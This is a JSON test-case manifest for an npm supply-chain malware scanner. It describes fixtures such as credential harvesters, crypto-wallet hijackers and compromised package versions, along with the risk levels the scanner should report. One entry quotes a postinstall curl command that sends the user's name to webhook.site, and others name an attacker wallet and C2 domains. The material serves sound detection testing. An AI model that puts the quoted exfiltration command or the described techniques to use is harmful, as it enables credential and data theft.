@@ -1,0 +1,417 @@
+{
+    "test_cases": [
+        {
+            "name": "clean-project",
+            "path": "test-cases/clean-project",
+            "expected_risks": [],
+            "description": "Should show no issues - clean project with no compromised packages",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "OK",
+                    "comment": "Clean package.json with legitimate dependencies (react, lodash, color). No suspicious packages or patterns.",
+                    "patterns_detected": [],
+                    "purpose": "Defines a clean project without security risks as baseline for tests."
+                }
+            ]
+        },
+        {
+            "name": "infected-project",
+            "path": "test-cases/infected-project",
+            "expected_risks": [
+                "HIGH",
+                "MEDIUM"
+            ],
+            "description": "Should show multiple issues - contains malicious webhook references and suspicious patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "HIGH",
+                    "comment": "Contains known compromised packages: @ctrl/tinycolor@4.1.0, @ctrl/deluge@1.2.0, @nativescript-community/ui-material-core@7.2.49",
+                    "patterns_detected": ["compromised_packages"],
+                    "purpose": "Simulates a project with known compromised NPM packages."
+                },
+                {
+                    "file": "malicious.js",
+                    "risk_level": "HIGH",
+                    "comment": "Contains webhook.site reference for data exfiltration. Clearly marked as test file for content detection.",
+                    "patterns_detected": ["webhook_site", "data_exfiltration"],
+                    "purpose": "Tests detection of webhook.site URLs as exfiltration endpoints."
+                },
+                {
+                    "file": "crypto-theft.js",
+                    "risk_level": "HIGH",
+                    "comment": "Implements wallet hijacking through window.ethereum manipulation and XMLHttpRequest interception. Redirects to attacker wallet 0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976.",
+                    "patterns_detected": ["crypto_wallet_hijacking", "xmlhttprequest_modification", "npmjs_help"],
+                    "purpose": "Simulates cryptocurrency theft malware with wallet manipulation."
+                },
+                {
+                    "file": "actual-credential-harvester.js",
+                    "risk_level": "HIGH",
+                    "comment": "Collects credentials from environment variables and files (~/.aws/credentials, ~/.ssh/id_rsa). Exfiltrates data via webhook.site. Very suspicious functions like harvestCredentials() and exfiltrateData().",
+                    "patterns_detected": ["credential_harvesting", "file_system_access", "webhook_site", "sensitive_env_vars"],
+                    "purpose": "Tests detection of credential harvesting malware."
+                },
+                {
+                    "file": "package-with-postinstall.json",
+                    "risk_level": "HIGH",
+                    "comment": "Package.json with highly suspicious postinstall script: 'curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)' - exfiltrates username via webhook.site immediately after installation.",
+                    "patterns_detected": ["malicious_postinstall", "webhook_site", "data_exfiltration", "whoami_command"],
+                    "purpose": "Tests detection of malicious npm lifecycle scripts that steal data immediately after installation."
+                },
+                {
+                    "file": "trufflehog-script.sh",
+                    "risk_level": "MEDIUM",
+                    "comment": "Shell script that executes TruffleHog and searches environment variables for AWS_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN. Ambivalent: could be security scanning or credential harvesting. Contains both grep commands and process.env references.",
+                    "patterns_detected": ["trufflehog_execution", "env_var_grep", "credential_patterns"],
+                    "purpose": "Tests distinction between legitimate security scanning and potential credential harvesting."
+                },
+                {
+                    "file": "malicious-trufflehog-wrapper.sh",
+                    "risk_level": "HIGH",
+                    "comment": "Definitely malicious TruffleHog wrapper: downloads TruffleHog, scans system-wide for secrets (/home/, /Users/), extracts AWS/GitHub/NPM tokens from results and exfiltrates them via curl to webhook.site. Subsequently deletes evidence (/tmp/secrets.json).",
+                    "patterns_detected": ["trufflehog_download", "system_wide_scanning", "credential_extraction", "webhook_site_exfiltration", "evidence_cleanup"],
+                    "purpose": "Clearly malicious TruffleHog abuse for automated credential theft."
+                },
+                {
+                    "file": ".github/workflows/shai-hulud-workflow.yml",
+                    "risk_level": "HIGH",
+                    "comment": "GitHub Actions workflow with malicious payload: contains curl command that sends data to webhook.site. Disguised as 'Test malicious workflow file' but performs actual data exfiltration.",
+                    "patterns_detected": ["malicious_ci_cd", "webhook_site", "curl_exfiltration"],
+                    "purpose": "Tests detection of malicious GitHub Actions that abuse CI/CD for data theft."
+                }
+            ]
+        },
+        {
+            "name": "chalk-debug-attack",
+            "path": "test-cases/chalk-debug-attack",
+            "expected_risks": ["HIGH"],
+            "description": "Should show HIGH risk - contains compromised chalk and debug packages with crypto theft patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "HIGH",
+                    "comment": "Contains compromised versions of the chalk/debug attack from September 8, 2025: chalk@5.6.1, debug@4.4.2, ansi-styles@6.2.2",
+                    "patterns_detected": ["compromised_chalk_debug", "specific_attack_versions"],
+                    "purpose": "Reproduces the known chalk/debug supply-chain attack."
+                },
+                {
+                    "file": "malicious-chalk.js",
+                    "risk_level": "HIGH",
+                    "comment": "Implementation of the actual chalk/debug attack with XMLHttpRequest hijacking, wallet replacement and contact to npmjs.help. Contains obfuscated code (_0x19ca67) and wallet addresses.",
+                    "patterns_detected": ["xmlhttprequest_hijacking", "wallet_replacement", "npmjs_help", "obfuscated_functions", "crypto_theft"],
+                    "purpose": "Exact replica of the real malware from the chalk/debug attack."
+                },
+                {
+                    "file": "obfuscated-payload.js",
+                    "risk_level": "HIGH",
+                    "comment": "Highly obfuscated payload using javascript-obfuscator. Contains wallet hijacking (_0x4f2a array with 'ethereum', 'wallet'), replaces ETH transactions with attacker wallet 0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976, and exfiltrates localStorage to npmjs.help.",
+                    "patterns_detected": ["javascript_obfuscation", "wallet_hijacking", "npmjs_help", "localStorage_theft", "hex_variables"],
+                    "purpose": "Tests detection of heavily obfuscated malicious code with disguised function names."
+                }
+            ]
+        },
+        {
+            "name": "network-exfiltration-project",
+            "path": "test-cases/network-exfiltration-project",
+            "expected_risks": ["HIGH"],
+            "description": "Should show HIGH risk - contains malicious webhook.site references and exfiltration patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Standard package.json, suspicious only in project context.",
+                    "patterns_detected": [],
+                    "purpose": "Baseline for network exfiltration scenario."
+                },
+                {
+                    "file": "malicious.js",
+                    "risk_level": "HIGH",
+                    "comment": "Multiple exfiltration patterns: hardcoded IPs (192.168.1.100), webhook.site, Base64-encoded URLs, WebSocket connections to evil.example.com, credential exfiltration from localStorage.",
+                    "patterns_detected": ["hardcoded_ip", "webhook_site", "base64_url", "websocket_exfiltration", "credential_theft"],
+                    "purpose": "Tests various network-based exfiltration techniques."
+                }
+            ]
+        },
+        {
+            "name": "legitimate-crypto",
+            "path": "test-cases/legitimate-crypto",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show MEDIUM risk only - legitimate cryptocurrency libraries that may trigger crypto theft patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Legitimate crypto libraries (ethers, web3, bitcoin-core) that may trigger medium-risk warnings.",
+                    "patterns_detected": ["crypto_libraries"],
+                    "purpose": "Tests false positive detection with legitimate crypto tools."
+                },
+                {
+                    "file": "wallet-utils.js",
+                    "risk_level": "OK",
+                    "comment": "Legitimate wallet utilities with proper use of ethers.js. Contains example Ethereum address for documentation, but no malicious patterns.",
+                    "patterns_detected": ["legitimate_crypto_usage"],
+                    "purpose": "Example of legitimate cryptocurrency handling without malware characteristics."
+                },
+                {
+                    "file": "http-client.js",
+                    "risk_level": "OK",
+                    "comment": "Legitimate HTTP client for crypto APIs without suspicious patterns.",
+                    "patterns_detected": [],
+                    "purpose": "Standard HTTP client for crypto services."
+                }
+            ]
+        },
+        {
+            "name": "common-crypto-libs",
+            "path": "test-cases/common-crypto-libs",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should not trigger HIGH risk false positives - common crypto libraries that should only show medium risk for crypto usage patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Commonly used crypto libraries that should not be detected as HIGH-risk false positives.",
+                    "patterns_detected": ["common_crypto_libs"],
+                    "purpose": "Prevents false positives with standard crypto libraries."
+                },
+                {
+                    "file": "ethers-usage.js",
+                    "risk_level": "OK",
+                    "comment": "Normal use of ethers.js library without malicious patterns.",
+                    "patterns_detected": ["legitimate_ethers_usage"],
+                    "purpose": "Shows legitimate ethers.js implementation."
+                },
+                {
+                    "file": "http-requests.js",
+                    "risk_level": "OK",
+                    "comment": "Standard HTTP requests for crypto APIs.",
+                    "patterns_detected": [],
+                    "purpose": "Normal HTTP communication with crypto services."
+                }
+            ]
+        },
+        {
+            "name": "typosquatting-project",
+            "path": "test-cases/typosquatting-project",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show MEDIUM risk - contains typosquatting packages",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Contains typosquatting packages: 'raect' instead of 'react', 'lodsh' instead of 'lodash', 'expres' instead of 'express', '@typеs/node' with Cyrillic 'е'.",
+                    "patterns_detected": ["typosquatting", "unicode_substitution"],
+                    "purpose": "Tests detection of typosquatting attacks on popular NPM packages."
+                }
+            ]
+        },
+        {
+            "name": "comprehensive-test",
+            "path": "test-cases/comprehensive-test",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show MEDIUM risk - contains typosquatting packages and suspicious network patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Comprehensive test with various suspicious packages.",
+                    "patterns_detected": ["comprehensive_threats"],
+                    "purpose": "Combines different threat types in one test."
+                },
+                {
+                    "file": "suspicious.js",
+                    "risk_level": "HIGH",
+                    "comment": "Comprehensive malicious patterns: data exfiltration via pastebin.com with Base64-encoded cookies, WebSocket connection to c2-server.evil.com, hardcoded private IP (10.0.1.50:9999/backdoor), Base64-decoded URLs. Definitely malicious.",
+                    "patterns_detected": ["pastebin_exfiltration", "base64_cookie_theft", "c2_websocket", "private_ip_hardcoded", "base64_url_decoding", "backdoor_endpoint"],
+                    "purpose": "Combines multiple high-risk exfiltration techniques in one file."
+                }
+            ]
+        },
+        {
+            "name": "mixed-project",
+            "path": "test-cases/mixed-project",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show medium risk issues - contains suspicious webhook usage but not definitive compromise",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Mixed project with partially suspicious elements.",
+                    "patterns_detected": ["mixed_risk_elements"],
+                    "purpose": "Tests detection of medium-risk scenarios."
+                },
+                {
+                    "file": "suspicious.js",
+                    "risk_level": "MEDIUM",
+                    "comment": "Contains webhook.site reference but with different endpoint ('some-other-endpoint'). Could be legitimate (webhook integration) or suspicious (data exfiltration). Ambivalent patterns require medium-risk classification.",
+                    "patterns_detected": ["webhook_site_alternative", "ambiguous_webhook_usage"],
+                    "purpose": "Tests detection of borderline webhook.site usage that is not clearly malicious."
+                }
+            ]
+        },
+        {
+            "name": "semver-matching",
+            "path": "test-cases/semver-matching",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show MEDIUM risk for packages that could match compromised versions - semver ranges that include compromised versions",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Semver ranges that could include compromised versions: @operato/board@~9.0.35, @ctrl/tinycolor@^4.0.0",
+                    "patterns_detected": ["semver_risk_ranges"],
+                    "purpose": "Tests detection of semver ranges that could contain compromised versions."
+                }
+            ]
+        },
+        {
+            "name": "namespace-warning",
+            "path": "test-cases/namespace-warning",
+            "expected_risks": ["LOW"],
+            "description": "Should show LOW risk namespace warnings only - packages from affected namespaces but safe versions",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "LOW",
+                    "comment": "Packages from affected namespaces but in safe versions, should only generate LOW-risk warnings.",
+                    "patterns_detected": ["affected_namespace", "safe_versions"],
+                    "purpose": "Tests namespace warnings without acute threat."
+                }
+            ]
+        },
+        {
+            "name": "debug-js",
+            "path": "test-cases/debug-js",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show MEDIUM risk - contains debug package that may trigger crypto theft patterns",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "MEDIUM",
+                    "comment": "Contains debug package that may trigger medium-risk crypto theft patterns.",
+                    "patterns_detected": ["debug_package_risk"],
+                    "purpose": "Tests specific detection of debug package in context of chalk/debug attack."
+                }
+            ]
+        },
+        {
+            "name": "legitimate-security-project",
+            "path": "test-cases/legitimate-security-project",
+            "expected_risks": ["MEDIUM"],
+            "description": "Should show MEDIUM risk - legitimate security tool using TruffleHog",
+            "files": [
+                {
+                    "file": "package.json",
+                    "risk_level": "LOW",
+                    "comment": "Package.json for legitimate security project.",
+                    "patterns_detected": ["security_project"],
+                    "purpose": "Baseline for legitimate security scanning project."
+                },
+                {
+                    "file": "security-scanner.py",
+                    "risk_level": "MEDIUM",
+                    "comment": "Legitimate Python security scanner script that uses TruffleHog. Collects environment variables and scans for secrets, but for legitimate security audits. Contains comments explicitly indicating legitimate purpose ('Legitimate security scanner', 'proper security tool, not malware').",
+                    "patterns_detected": ["legitimate_trufflehog_usage", "security_scanning", "env_var_scanning"],
+                    "purpose": "Distinction between legitimate security scanning and malicious credential harvesting."
+                }
+            ]
+        },
+        {
+            "name": "false-positive-project",
+            "path": "test-cases/false-positive-project",
+            "expected_risks": [],
+            "description": "Should show no issues - legitimate code that should not trigger false positives",
+            "files": [
+                {
+                    "file": "express-server.js",
+                    "risk_level": "OK",
+                    "comment": "Legitimate Express.js server that uses environment variables. Contains AWS config and JWT secrets from ENV, but this is normal practice.",
+                    "patterns_detected": ["legitimate_env_usage"],
+                    "purpose": "Tests that normal ENV usage does not trigger false positives."
+                },
+                {
+                    "file": "vue-component.js",
+                    "risk_level": "OK",
+                    "comment": "Standard Vue.js component without suspicious patterns.",
+                    "patterns_detected": [],
+                    "purpose": "Normal frontend component as false positive test."
+                },
+                {
+                    "file": "webpack.config.js",
+                    "risk_level": "OK",
+                    "comment": "Standard webpack configuration without suspicious elements.",
+                    "patterns_detected": [],
+                    "purpose": "Build tool configuration that should not trigger warnings."
+                }
+            ]
+        },
+        {
+            "name": "edge-case-project",
+            "path": "test-cases/edge-case-project",
+            "expected_risks": ["LOW"],
+            "description": "Should show LOW risk - documentation mentions credentials but is legitimate",
+            "files": [
+                {
+                    "file": "documentation.md",
+                    "risk_level": "LOW",
+                    "comment": "Documentation that mentions credentials (AWS_ACCESS_KEY, GITHUB_TOKEN) but as legitimate instructions, not as malware. Should only trigger LOW-risk due to mention of sensitive terms.",
+                    "patterns_detected": ["credential_mentions_in_docs"],
+                    "purpose": "Tests distinction between malicious code and legitimate documentation."
+                }
+            ]
+        },
+        {
+            "name": "infected-lockfile",
+            "path": "test-cases/infected-lockfile",
+            "expected_risks": [],
+            "description": "Should show no issues - empty directory for lockfile testing",
+            "files": [
+                {
+                    "file": "package-lock.json",
+                    "risk_level": "OK",
+                    "comment": "Standard package-lock.json with @ctrl/tinycolor@4.1.2 - appears to be clean, no compromised version.",
+                    "patterns_detected": [],
+                    "purpose": "Test for lockfile detection without actual threat."
+                }
+            ]
+        },
+        {
+            "name": "infected-lockfile-pnpm",
+            "path": "test-cases/infected-lockfile-pnpm",
+            "expected_risks": ["HIGH"],
+            "description": "Should show HIGH risk - contains compromised package in pnpm-lock.yaml",
+            "files": [
+                {
+                    "file": "pnpm-lock.yaml",
+                    "risk_level": "HIGH",
+                    "comment": "pnpm-lock.yaml with @ctrl/tinycolor@4.1.2 - if this is a compromised version, HIGH-risk should be detected.",
+                    "patterns_detected": ["compromised_package_in_lockfile"],
+                    "purpose": "Tests detection of compromised packages in pnpm lockfiles."
+                }
+            ]
+        },
+        {
+            "name": "multi-hash-detection",
+            "path": "test-cases/multi-hash-detection",
+            "expected_risks": [],
+            "description": "Should show no issues - test files for hash detection without malicious content",
+            "files": [
+                {
+                    "file": "file1.js",
+                    "risk_level": "OK",
+                    "comment": "Test file with UUIDs (e1ba42e9-3f46-4486-8880-959c922ff5d4, c444604a-6cbe-4cbb-ba4b-dcdec36e7cb3) for multi-hash detection tests without malicious content.",
+                    "patterns_detected": ["uuid_patterns"],
+                    "purpose": "Tests hash detection without real threats."
+                },
+                {
+                    "file": "file2.js",
+                    "risk_level": "OK",
+                    "comment": "Test file with other UUIDs (a5172f7e-ce94-46e6-a8bb-201ba707da0f, f67d415e-bef1-44d9-8caa-fbbd7fe60eb1) for multi-hash detection tests.",
+                    "patterns_detected": ["uuid_patterns"],
+                    "purpose": "Second test file for multi-hash scenarios."
+                }
+            ]
+        }
+    ]
+}
